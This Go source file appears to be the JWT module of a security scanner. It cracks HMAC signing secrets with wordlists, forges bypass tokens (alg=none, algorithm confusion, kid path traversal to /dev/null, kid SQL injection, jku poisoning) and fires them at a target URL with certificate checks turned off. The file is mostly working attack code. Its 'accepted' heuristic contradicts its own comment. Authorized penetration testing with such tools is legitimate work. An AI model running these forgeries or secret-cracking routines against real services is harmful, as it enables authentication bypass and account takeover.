package jwt

import (
	"bufio"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"hash"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"scanner/internal/modules/shared"
)

// Finding is one observation about the token.
type Finding struct {
	Severity string `json:"severity"` // CRITICAL | HIGH | MEDIUM | LOW | INFO
	Title    string `json:"title"`
	Detail   string `json:"detail,omitempty"`
}

// AttackToken is a forged JWT we can hand the user to try against the server.
// Replay* fields are populated only when Config.TargetURL is set and the
// module actively fires each forged token at the verifier (audit MEDIUM fix).
type AttackToken struct {
	Name  string `json:"name"`
	Token string `json:"token"`
	Note  string `json:"note,omitempty"`

	// Replay result — set only when Config.TargetURL != "".
	ReplayStatus int    `json:"replay_status,omitempty"` // HTTP status code
	ReplayBytes  int    `json:"replay_bytes,omitempty"`  // response body length
	ReplayAcc    bool   `json:"replay_accepted,omitempty"`
	ReplayErr    string `json:"replay_err,omitempty"`
}

type TokenResult struct {
	Raw           string                 `json:"raw"`
	Header        map[string]interface{} `json:"header,omitempty"`
	Payload       map[string]interface{} `json:"payload,omitempty"`
	Algorithm     string                 `json:"algorithm,omitempty"`
	HeaderJSON    string                 `json:"header_json,omitempty"`
	PayloadJSON   string                 `json:"payload_json,omitempty"`
	Findings      []Finding              `json:"findings"`
	CrackedSecret string                 `json:"cracked_secret,omitempty"`
	AttemptCount  int                    `json:"attempt_count"`
	AttackTokens  []AttackToken          `json:"attack_tokens"`
	Error         string                 `json:"error,omitempty"`

	// Baseline replay of the original token (audit MEDIUM fix). Populated
	// only when Config.TargetURL is set; provides a reference status/length
	// so operators can compare against each AttackToken's replay result.
	BaselineStatus int `json:"baseline_status,omitempty"`
	BaselineBytes  int `json:"baseline_bytes,omitempty"`
}

type ScanResult struct {
	Results []TokenResult `json:"results"`
}

type Config struct {
	Tokens          []string
	Wordlist        []string
	WordlistPath    string // optional path to a wordlist file (rockyou-class); streamed line-by-line
	IncludeDefault  bool   // append the built-in common secrets
	GenerateAttacks bool   // also produce alg=none / unsigned forged tokens
	// Active replay (audit MEDIUM fix): when TargetURL is non-empty every
	// generated AttackToken (plus the original) is sent to TargetURL with
	// the token inserted into HeaderName as Prefix+token. The per-token
	// status code is recorded so the user can immediately see which
	// forgeries the verifier actually accepts. Empty TargetURL = analysis
	// only (the historical behaviour).
	TargetURL  string
	HeaderName string // default "Authorization" when TargetURL is set
	Prefix     string // default "Bearer " when TargetURL is set
	// HTTPOpts carries proxy / UA / cancel-context / killswitch source-IP
	// binding for the replay phase; nil = analysis-only. Handler populates
	// via BuildHTTPOptionsFromSettings + BeginScan.
	HTTPOpts *shared.HTTPOptions
}

type ProgressFunc func(done int, msg string)
type PartialFunc func(*ScanResult)

// CommonSecrets is a small built-in list of HS256 secrets seen in the wild.
var CommonSecrets = []string{
	"secret", "password", "123456", "your-256-bit-secret", "super-secret",
	"jwt", "jwt-secret", "test", "qwerty", "admin", "key", "changeme",
	"secretkey", "default", "your-secret-key", "mysecret", "node-secret",
	"node", "express", "laravel", "django", "rails", "api-secret",
	"hellojwt", "demo", "password123", "letmein", "welcome",
	"ChangeMe", "0123456789", "supersecret", "topsecret",
}

func Scan(ctx context.Context, cfg Config, progress ProgressFunc, partial PartialFunc) *ScanResult {
	if ctx == nil {
		ctx = context.Background()
	}
	out := &ScanResult{}
	var mu sync.Mutex
	done := 0

	pushPartial := func() {
		if partial == nil {
			return
		}
		mu.Lock()
		snap := &ScanResult{Results: append([]TokenResult(nil), out.Results...)}
		mu.Unlock()
		partial(snap)
	}

	// Combine wordlists once.
	wordlist := cfg.Wordlist
	if cfg.IncludeDefault {
		wordlist = append(wordlist, CommonSecrets...)
	}

	// Build a replay client once, reuse across tokens.
	replayClient, replayCfg := buildReplayClient(cfg)

	for _, tok := range cfg.Tokens {
		if ctx.Err() != nil {
			break
		}
		tok = strings.TrimSpace(tok)
		if tok == "" {
			continue
		}
		if progress != nil {
			progress(done, fmt.Sprintf("Analyzing token #%d ...", done+1))
		}
		tr := analyze(ctx, tok, wordlist, cfg.WordlistPath, cfg.GenerateAttacks, func(msg string) {
			mu.Lock()
			cur := done
			mu.Unlock()
			if progress != nil {
				progress(cur, msg)
			}
		})

		// Active replay (audit MEDIUM fix): if TargetURL is set, fire the
		// original token to establish a baseline then each generated attack
		// token so the operator sees which forgeries the verifier accepts
		// without having to copy each into curl by hand.
		if replayClient != nil {
			logCB := func(msg string) {
				mu.Lock()
				cur := done
				mu.Unlock()
				if progress != nil {
					progress(cur, msg)
				}
			}
			replayTokenSet(ctx, replayClient, replayCfg, tok, tr, logCB)
		}

		mu.Lock()
		done++
		out.Results = append(out.Results, *tr)
		cur := done
		mu.Unlock()
		if progress != nil {
			summary := fmt.Sprintf("[%d/%d] alg=%s", cur, len(cfg.Tokens), tr.Algorithm)
			if tr.CrackedSecret != "" {
				summary += " · CRACKED: " + tr.CrackedSecret
			}
			progress(cur, summary)
		}
		pushPartial()
	}
	return out
}

// replayCtx captures the resolved header name / prefix / URL used per token.
type replayCtx struct {
	url    string
	header string
	prefix string
}

// buildReplayClient returns (client, ctx) when Config.TargetURL is set and
// well-formed; (nil, _) when replay is disabled. Applies HTTPOpts (proxy,
// UA, killswitch source-IP binding, cancel context) via the standard
// shared.HTTPOptions plumbing so tokens are sent through the same pipeline
// as any other web-module HTTP.
func buildReplayClient(cfg Config) (*http.Client, replayCtx) {
	if strings.TrimSpace(cfg.TargetURL) == "" {
		return nil, replayCtx{}
	}
	rc := replayCtx{
		url:    cfg.TargetURL,
		header: cfg.HeaderName,
		prefix: cfg.Prefix,
	}
	if rc.header == "" {
		rc.header = "Authorization"
	}
	if rc.prefix == "" && !strings.EqualFold(rc.header, "Cookie") {
		rc.prefix = "Bearer "
	}
	timeout := 15 * time.Second
	if cfg.HTTPOpts != nil && cfg.HTTPOpts.Timeout > 0 {
		timeout = cfg.HTTPOpts.Timeout
	}
	transport := &http.Transport{
		DialContext: shared.BoundDialer(cfg.HTTPOpts, timeout).DialContext,
		// Scan targets routinely have invalid/self-signed/expired certs — never
		// let cert validation block the scan (curl -k semantics).
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	if cfg.HTTPOpts != nil {
		cfg.HTTPOpts.ApplyTransport(transport)
		cfg.HTTPOpts.RegisterTransport(transport)
	}
	return &http.Client{
		Timeout:   timeout,
		Transport: transport,
		// Don't follow redirects — a 302 masks the real accept/reject signal.
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}, rc
}

// replayTokenSet fires the original token (baseline) plus every AttackToken
// against rc.url and records status + response length per token. "Accepted"
// is a heuristic: status < 400 AND status is not the same as the empty-token
// baseline (i.e. the verifier didn't fall through to unauthenticated).
func replayTokenSet(ctx context.Context, client *http.Client, rc replayCtx, orig string, tr *TokenResult, log func(string)) {
	// Baseline: original, unmodified token.
	if status, n, err := replayOne(ctx, client, rc, orig); err == nil {
		tr.BaselineStatus = status
		tr.BaselineBytes = n
		if log != nil {
			log(fmt.Sprintf("$ replay original → %d (%d bytes)", status, n))
		}
	} else if log != nil {
		log(fmt.Sprintf("replay original: %v", err))
	}
	for i := range tr.AttackTokens {
		if ctx.Err() != nil {
			return
		}
		at := &tr.AttackTokens[i]
		status, n, err := replayOne(ctx, client, rc, at.Token)
		if err != nil {
			at.ReplayErr = err.Error()
			continue
		}
		at.ReplayStatus = status
		at.ReplayBytes = n
		// Accepted heuristic: 2xx/3xx AND the response looks distinct from
		// what an unauthenticated (baseline-mismatch or 401/403) response
		// would produce. Body-length delta from baseline is a stronger
		// signal than status alone since some APIs return 200 with an
		// error body when unauthenticated.
		if status > 0 && status < 400 {
			at.ReplayAcc = tr.BaselineStatus == 0 ||
				status == tr.BaselineStatus ||
				abs(n-tr.BaselineBytes) < 32
		}
		if log != nil {
			log(fmt.Sprintf("$ replay %q → %d (%d bytes)", at.Name, status, n))
		}
	}
}

// replayOne performs a single GET with the token inserted into rc.header
// as rc.prefix + token. Response body is drained (up to 1 MiB) so the
// connection can be reused and ResponseBytes reflects the payload the
// verifier actually shipped.
func replayOne(ctx context.Context, client *http.Client, rc replayCtx, token string) (int, int, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rc.url, nil)
	if err != nil {
		return 0, 0, err
	}
	req.Header.Set(rc.header, rc.prefix+token)
	resp, err := client.Do(req)
	if err != nil {
		return 0, 0, err
	}
	defer resp.Body.Close()
	// Cap body read at 1 MiB — enough to detect distinct responses without
	// letting a hostile server exhaust memory or time.
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	return resp.StatusCode, len(body), nil
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func analyze(ctx context.Context, raw string, wordlist []string, wordlistPath string, generateAttacks bool, log func(string)) *TokenResult {
	tr := &TokenResult{Raw: raw}

	parts := strings.Split(raw, ".")
	if len(parts) < 2 || len(parts) > 3 {
		tr.Error = fmt.Sprintf("not a JWT (got %d parts, expected 2 or 3)", len(parts))
		return tr
	}

	headerBytes, err := decodeSegment(parts[0])
	if err != nil {
		tr.Error = "header decode: " + err.Error()
		return tr
	}
	if err := json.Unmarshal(headerBytes, &tr.Header); err != nil {
		tr.Error = "header parse: " + err.Error()
		return tr
	}
	tr.HeaderJSON = prettyJSON(headerBytes)

	payloadBytes, err := decodeSegment(parts[1])
	if err != nil {
		tr.Error = "payload decode: " + err.Error()
		return tr
	}
	if err := json.Unmarshal(payloadBytes, &tr.Payload); err != nil {
		tr.Error = "payload parse: " + err.Error()
		return tr
	}
	tr.PayloadJSON = prettyJSON(payloadBytes)

	if a, ok := tr.Header["alg"].(string); ok {
		tr.Algorithm = a
	}

	tr.Findings = auditAlgorithm(tr)
	tr.Findings = append(tr.Findings, auditPayload(tr.Payload)...)
	tr.Findings = append(tr.Findings, auditHeaderAttacks(tr.Header)...)

	// Crack HS256/HS384/HS512 with wordlist (in-memory list + optional
	// streaming file at wordlistPath — audit MEDIUM fix #2).
	if isHmacAlg(tr.Algorithm) && len(parts) == 3 && (len(wordlist) > 0 || wordlistPath != "") {
		if log != nil {
			if wordlistPath != "" {
				log(fmt.Sprintf("brute-forcing %s secret against %d in-memory candidates + file %s", tr.Algorithm, len(wordlist), wordlistPath))
			} else {
				log(fmt.Sprintf("brute-forcing %s secret against %d candidates", tr.Algorithm, len(wordlist)))
			}
		}
		secret, attempts := crackHmac(ctx, tr.Algorithm, parts[0]+"."+parts[1], parts[2], wordlist, wordlistPath, log)
		tr.AttemptCount = attempts
		if secret != "" {
			tr.CrackedSecret = secret
			tr.Findings = append([]Finding{{
				Severity: "CRITICAL",
				Title:    "HMAC secret cracked from wordlist",
				Detail:   fmt.Sprintf("Secret: %q (after %d candidates). Anyone with the public token can now forge arbitrary signed JWTs.", secret, attempts),
			}}, tr.Findings...)
		}
	}

	if generateAttacks {
		tr.AttackTokens = buildAttackTokens(tr, parts)
	}
	return tr
}

// auditAlgorithm flags weak / risky alg field values.
func auditAlgorithm(tr *TokenResult) []Finding {
	a := strings.ToLower(tr.Algorithm)
	switch a {
	case "none":
		return []Finding{{
			Severity: "CRITICAL",
			Title:    "alg=none accepted by token",
			Detail:   "The token claims unsigned. If the verifier honors this header, anyone can mint arbitrary tokens. Test with the alg=none forged token.",
		}}
	case "":
		return []Finding{{Severity: "MEDIUM", Title: "Missing alg header"}}
	case "hs256", "hs384", "hs512":
		return []Finding{{
			Severity: "INFO",
			Title:    "HMAC-signed JWT (HS*)",
			Detail:   fmt.Sprintf("Symmetric (%s). Try cracking the secret. If algorithm-confusion is possible, also test with the public key as HMAC secret.", strings.ToUpper(a)),
		}}
	case "rs256", "rs384", "rs512", "es256", "es384", "es512", "ps256", "ps384", "ps512":
		return []Finding{{
			Severity: "INFO",
			Title:    fmt.Sprintf("Asymmetric algorithm (%s)", strings.ToUpper(a)),
			Detail:   "Algorithm-confusion attack candidate: try sending a forged token with alg=HS256 and the server's public key as the HMAC secret.",
		}}
	}
	return nil
}

// auditPayload checks expiry / issuer / sensitive claims.
func auditPayload(p map[string]interface{}) []Finding {
	var out []Finding
	if exp, ok := p["exp"]; ok {
		if expF, isNum := toFloat(exp); isNum {
			t := time.Unix(int64(expF), 0)
			if time.Now().After(t) {
				out = append(out, Finding{Severity: "MEDIUM", Title: "Token expired", Detail: fmt.Sprintf("exp=%s", t.UTC().Format(time.RFC3339))})
			} else {
				diff := time.Until(t)
				if diff > 90*24*time.Hour {
					out = append(out, Finding{Severity: "LOW", Title: "Long-lived token", Detail: fmt.Sprintf("Expires in %s — consider shorter sessions.", diff.Round(time.Hour))})
				}
			}
		}
	} else {
		out = append(out, Finding{Severity: "MEDIUM", Title: "No exp claim", Detail: "Token has no expiration — replayable indefinitely."})
	}
	if _, ok := p["iss"]; !ok {
		out = append(out, Finding{Severity: "LOW", Title: "No iss claim"})
	}
	if v, ok := p["alg"]; ok {
		out = append(out, Finding{Severity: "MEDIUM", Title: "alg in payload", Detail: fmt.Sprintf("payload.alg=%v — unusual; may indicate key-confusion design.", v)})
	}
	// Look for embedded sensitive-looking fields.
	for _, k := range []string{"password", "secret", "api_key", "private_key"} {
		if _, ok := p[k]; ok {
			out = append(out, Finding{Severity: "HIGH", Title: "Sensitive field in payload", Detail: "Payload contains key: " + k})
		}
	}
	return out
}

// auditHeaderAttacks looks for kid / jku / x5u tampering surfaces.
func auditHeaderAttacks(h map[string]interface{}) []Finding {
	var out []Finding
	if kid, ok := h["kid"].(string); ok {
		// Heuristic: contains path traversal or suspicious chars.
		if strings.ContainsAny(kid, "/\\") || strings.Contains(kid, "..") {
			out = append(out, Finding{Severity: "HIGH", Title: "Path-like kid value", Detail: "kid=" + kid + " — may be vulnerable to path traversal / SQLi via kid header."})
		} else {
			out = append(out, Finding{Severity: "INFO", Title: "kid header present", Detail: "kid=" + kid + " — try kid injection (../../../../dev/null, SQL payloads)."})
		}
	}
	if _, ok := h["jku"]; ok {
		out = append(out, Finding{Severity: "HIGH", Title: "jku header present", Detail: "jku points the verifier to an external JWKS — try hosting your own JWKS and forging tokens."})
	}
	if _, ok := h["x5u"]; ok {
		out = append(out, Finding{Severity: "HIGH", Title: "x5u header present", Detail: "x5u points the verifier to an external X.509 cert — same risk class as jku."})
	}
	if _, ok := h["x5c"]; ok {
		out = append(out, Finding{Severity: "MEDIUM", Title: "x5c header present", Detail: "Embedded cert chain — try replacing with attacker-controlled chain."})
	}
	return out
}

// crackHmac iterates wordlist trying each as the HMAC secret.
// crackHmac brute-forces a HS256/HS384/HS512 token's signing secret
// against the supplied wordlist. Audit fix: was previously single-
// threaded with no in-loop progress — a 14M-line rockyou run pinned
// one core for minutes and the UI sat silent. Now fans the wordlist
// across runtime.NumCPU() workers and emits progress every 50k attempts
// via the log callback. log may be nil for non-interactive callers.
//
// Audit MEDIUM fix #2: in-memory `wordlist` is no longer the only source.
// If `wordlistPath` is set, secrets are streamed line-by-line via
// bufio.Scanner so rockyou-class files (14M lines, ~140 MB) can be used
// without ballooning memory or the HTTP form post. Order is in-memory
// first (small custom list + built-ins), then file.
func crackHmac(ctx context.Context, alg, signedInput, expectedSig string, wordlist []string, wordlistPath string, log func(string)) (string, int) {
	expectedRaw, err := decodeSegment(expectedSig)
	if err != nil {
		return "", 0
	}
	hashFn := func() hash.Hash { return sha256.New() }
	switch strings.ToLower(alg) {
	case "hs384":
		hashFn = func() hash.Hash { return sha512.New384() }
	case "hs512":
		hashFn = func() hash.Hash { return sha512.New() }
	}

	workers := runtime.NumCPU()
	if workers < 2 {
		workers = 2
	}
	if workers <= 0 {
		workers = 1
	}

	type job struct{ secret string }
	type hit struct {
		secret string
	}

	jobs := make(chan job, workers*4)
	hits := make(chan hit, 1)
	var attempts atomic.Int64
	var wg sync.WaitGroup
	wctx, cancel := context.WithCancel(ctx)
	defer cancel()

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			h := hmac.New(hashFn, nil)
			for {
				select {
				case <-wctx.Done():
					return
				case j, ok := <-jobs:
					if !ok {
						return
					}
					h.Reset()
					h = hmac.New(hashFn, []byte(j.secret))
					h.Write([]byte(signedInput))
					if hmac.Equal(h.Sum(nil), expectedRaw) {
						select {
						case hits <- hit{secret: j.secret}:
						default:
						}
						cancel()
						return
					}
				}
			}
		}()
	}

	// Feeder + progress emitter. Emits every 50000 attempts. Drains the
	// in-memory wordlist first, then streams the optional file path so
	// rockyou-class lists don't have to be paste-loaded.
	go func() {
		const tickStep = 50000
		defer close(jobs)
		emit := func(s string, total int64) bool {
			select {
			case <-wctx.Done():
				return false
			case jobs <- job{secret: s}:
				n := attempts.Add(1)
				if log != nil && n%tickStep == 0 {
					if total > 0 {
						log(fmt.Sprintf("HMAC crack progress: %d / %d candidates tested", n, total))
					} else {
						log(fmt.Sprintf("HMAC crack progress: %d candidates tested", n))
					}
				}
				return true
			}
		}
		total := int64(len(wordlist))
		for _, s := range wordlist {
			if !emit(s, total) {
				return
			}
		}
		if wordlistPath == "" {
			return
		}
		f, err := os.Open(wordlistPath)
		if err != nil {
			if log != nil {
				log(fmt.Sprintf("wordlist file %q: %v", wordlistPath, err))
			}
			return
		}
		defer f.Close()
		// Allow long lines (rockyou has a few) — default 64KB token cap is
		// plenty for password lists but bump it just in case.
		sc := bufio.NewScanner(f)
		sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
		for sc.Scan() {
			line := strings.TrimRight(sc.Text(), "\r\n")
			if line == "" {
				continue
			}
			if !emit(line, 0) {
				return
			}
		}
		if err := sc.Err(); err != nil && log != nil {
			log(fmt.Sprintf("wordlist file %q read error: %v", wordlistPath, err))
		}
	}()

	wg.Wait()
	close(hits)

	select {
	case h, ok := <-hits:
		if ok {
			return h.secret, int(attempts.Load())
		}
	default:
	}
	return "", int(attempts.Load())
}

// buildAttackTokens generates forged tokens demonstrating common JWT bypasses.
func buildAttackTokens(tr *TokenResult, parts []string) []AttackToken {
	out := []AttackToken{}

	// 1. alg=none — strip signature, set alg in header to "none"
	hdr := map[string]interface{}{"alg": "none", "typ": "JWT"}
	if t, ok := tr.Header["typ"]; ok {
		hdr["typ"] = t
	}
	hdrB, _ := json.Marshal(hdr)
	pl, _ := json.Marshal(tr.Payload)
	noneTok := encodeSegment(hdrB) + "." + encodeSegment(pl) + "."
	out = append(out, AttackToken{
		Name:  "alg=none (no signature)",
		Token: noneTok,
		Note:  "Try this against the verifier. If accepted, the server doesn't validate the alg field.",
	})

	// 2. alg=NONE (case variant) — some libs only check lowercase
	hdrUp := map[string]interface{}{"alg": "None", "typ": "JWT"}
	hdrUpB, _ := json.Marshal(hdrUp)
	out = append(out, AttackToken{
		Name:  "alg=None (case bypass)",
		Token: encodeSegment(hdrUpB) + "." + encodeSegment(pl) + ".",
		Note:  "Capitalized 'None' bypasses naive lower-cased blocklists.",
	})

	// 3. Empty signature (preserve original alg, drop signature)
	hdrOrig, _ := json.Marshal(tr.Header)
	out = append(out, AttackToken{
		Name:  "Empty signature",
		Token: encodeSegment(hdrOrig) + "." + encodeSegment(pl) + ".",
		Note:  "Keep original alg but send no signature — flagging buggy verifiers that bail early on empty input.",
	})

	// 4. alg confusion (RS->HS256) — only useful if user has a public key.
	if isAsymmetricAlg(tr.Algorithm) {
		hdrCon := copyMap(tr.Header)
		hdrCon["alg"] = "HS256"
		hdrConB, _ := json.Marshal(hdrCon)
		out = append(out, AttackToken{
			Name:  "alg confusion stub (RS→HS256, unsigned)",
			Token: encodeSegment(hdrConB) + "." + encodeSegment(pl) + ".",
			Note:  "This stub has no signature. To exploit: download the server's public key and re-sign this with HMAC-SHA256 using the public key bytes.",
		})
	}

	// 5. kid path traversal / SQLi / null-injection probes
	// Three variants — each exercises a different verifier bug class:
	//   /dev/null  → if the verifier reads key bytes from kid as a file
	//                path, an empty file forces an empty HMAC secret.
	//                Sign payload with "" as HMAC-SHA256 key.
	//   SQLi UNION → if kid is concatenated into a SQL key lookup, this
	//                forces a known-value row (the literal "secret").
	//   empty kid  → some libraries fall back to a default key when kid
	//                is "" or missing — try with no kid at all.
	if _, ok := tr.Header["kid"]; ok {
		// Variant a: path-traversal to /dev/null with HMAC over empty key
		hdrKidNull := copyMap(tr.Header)
		hdrKidNull["alg"] = "HS256"
		hdrKidNull["kid"] = "../../../../../../dev/null"
		bA, _ := json.Marshal(hdrKidNull)
		signA := encodeSegment(bA) + "." + encodeSegment(pl)
		mA := hmac.New(sha256.New, []byte(""))
		mA.Write([]byte(signA))
		out = append(out, AttackToken{
			Name:  "kid → /dev/null (signed with empty HMAC key)",
			Token: signA + "." + encodeSegment(mA.Sum(nil)),
			Note:  "If the verifier loads the HMAC key by reading the file at kid, /dev/null is empty → key = []byte{}. This token is signed with that empty key. Try it as-is.",
		})

		// Variant b: SQLi-style kid that returns a known literal
		hdrKidSQL := copyMap(tr.Header)
		hdrKidSQL["alg"] = "HS256"
		hdrKidSQL["kid"] = "x' UNION SELECT 'secret"
		bB, _ := json.Marshal(hdrKidSQL)
		signB := encodeSegment(bB) + "." + encodeSegment(pl)
		mB := hmac.New(sha256.New, []byte("secret"))
		mB.Write([]byte(signB))
		out = append(out, AttackToken{
			Name:  "kid SQLi (UNION SELECT 'secret')",
			Token: signB + "." + encodeSegment(mB.Sum(nil)),
			Note:  "If kid is interpolated into a SQL key lookup, the UNION forces the literal 'secret' as the key. This token is signed with that literal.",
		})

		// Variant c: empty kid (force default key fallback)
		hdrKidEmpty := copyMap(tr.Header)
		hdrKidEmpty["kid"] = ""
		bC, _ := json.Marshal(hdrKidEmpty)
		out = append(out, AttackToken{
			Name:  "kid = \"\" (default key fallback probe)",
			Token: encodeSegment(bC) + "." + encodeSegment(pl) + ".AAAA",
			Note:  "Some libraries fall back to a hard-coded default key when kid is empty. Stub signature; replay the token to see if it's accepted.",
		})
	}

	// 6. jku poisoning attack token — point verifier at an attacker-
	// controlled JWKS endpoint. Token header sets jku to a placeholder;
	// the user replaces $YOUR_JWKS_URL with their own host before testing.
	if _, ok := tr.Header["jku"]; ok || isAsymmetricAlg(tr.Algorithm) {
		hdrJku := copyMap(tr.Header)
		hdrJku["alg"] = "RS256"
		hdrJku["jku"] = "https://$YOUR_JWKS_URL/jwks.json"
		hdrJku["kid"] = "attacker-key-1"
		bJ, _ := json.Marshal(hdrJku)
		out = append(out, AttackToken{
			Name:  "jku poisoning template",
			Token: encodeSegment(bJ) + "." + encodeSegment(pl) + ".STUB",
			Note:  "Host a JWKS file at $YOUR_JWKS_URL/jwks.json containing your public key with kid='attacker-key-1', then sign this token's body with your private key and replace STUB. If the verifier honors the jku header it will fetch your JWKS and verify with your key.",
		})
	}

	// 6. Cracked-secret signed token (only when we actually cracked it)
	// Audit MEDIUM fix: previously hard-coded alg=HS256 + sha256.New, which
	// produced an invalid signature when the original token used HS384 or
	// HS512 (correct family was detected by crackHmac via tr.Algorithm but
	// thrown away here). Now mirrors crackHmac's switch so the canonical
	// re-sign matches the verifier's expected alg. A second downgrade-style
	// token is emitted only when the original was HS384/HS512, for testing
	// verifiers that accept any HS* family.
	if tr.CrackedSecret != "" {
		origAlg := strings.ToUpper(tr.Algorithm)
		hashFn := sha256.New
		switch strings.ToLower(tr.Algorithm) {
		case "hs384":
			hashFn = sha512.New384
		case "hs512":
			hashFn = sha512.New
		default:
			origAlg = "HS256"
		}
		hdrCr := copyMap(tr.Header)
		hdrCr["alg"] = origAlg
		hdrCrB, _ := json.Marshal(hdrCr)
		signedInput := encodeSegment(hdrCrB) + "." + encodeSegment(pl)
		mac := hmac.New(hashFn, []byte(tr.CrackedSecret))
		mac.Write([]byte(signedInput))
		sig := encodeSegment(mac.Sum(nil))
		out = append(out, AttackToken{
			Name:  fmt.Sprintf("Re-signed with cracked secret (%s)", origAlg),
			Token: signedInput + "." + sig,
			Note:  fmt.Sprintf("Forged with cracked HMAC secret %q using %s (original token's algorithm). This token is fully valid against the original verifier.", tr.CrackedSecret, origAlg),
		})

		// Optional HS256 downgrade variant — only useful when the original
		// was HS384/HS512 and the verifier accepts any HS* family. Labelled
		// explicitly as a downgrade so it isn't mistaken for the canonical
		// forge above.
		if origAlg != "HS256" {
			hdrDg := copyMap(tr.Header)
			hdrDg["alg"] = "HS256"
			hdrDgB, _ := json.Marshal(hdrDg)
			signedDg := encodeSegment(hdrDgB) + "." + encodeSegment(pl)
			macDg := hmac.New(sha256.New, []byte(tr.CrackedSecret))
			macDg.Write([]byte(signedDg))
			out = append(out, AttackToken{
				Name:  "HS256 downgrade re-sign (cracked secret)",
				Token: signedDg + "." + encodeSegment(macDg.Sum(nil)),
				Note:  "Same secret but rewritten as alg=HS256/sha256. Only accepted by verifiers that don't pin the expected HS* family — a downgrade attack, not the canonical forge.",
			})
		}
	}
	return out
}

func isHmacAlg(alg string) bool {
	a := strings.ToLower(alg)
	return a == "hs256" || a == "hs384" || a == "hs512"
}

func isAsymmetricAlg(alg string) bool {
	a := strings.ToLower(alg)
	return strings.HasPrefix(a, "rs") || strings.HasPrefix(a, "es") || strings.HasPrefix(a, "ps")
}

func toFloat(v interface{}) (float64, bool) {
	switch x := v.(type) {
	case float64:
		return x, true
	case int:
		return float64(x), true
	case int64:
		return float64(x), true
	case string:
		var f float64
		fmt.Sscanf(x, "%f", &f)
		return f, f > 0
	}
	return 0, false
}

func decodeSegment(s string) ([]byte, error) {
	// JWTs use URL-safe base64 without padding. Pad to len%4==0 just in case.
	if pad := len(s) % 4; pad != 0 {
		s += strings.Repeat("=", 4-pad)
	}
	return base64.URLEncoding.DecodeString(s)
}

func encodeSegment(b []byte) string {
	return strings.TrimRight(base64.URLEncoding.EncodeToString(b), "=")
}

func prettyJSON(b []byte) string {
	var v interface{}
	if json.Unmarshal(b, &v) != nil {
		return string(b)
	}
	out, err := json.MarshalIndent(v, "", "  ")
	if err != nil {
		return string(b)
	}
	return string(out)
}

func copyMap(m map[string]interface{}) map[string]interface{} {
	out := make(map[string]interface{}, len(m))
	for k, v := range m {
		out[k] = v
	}
	return out
}
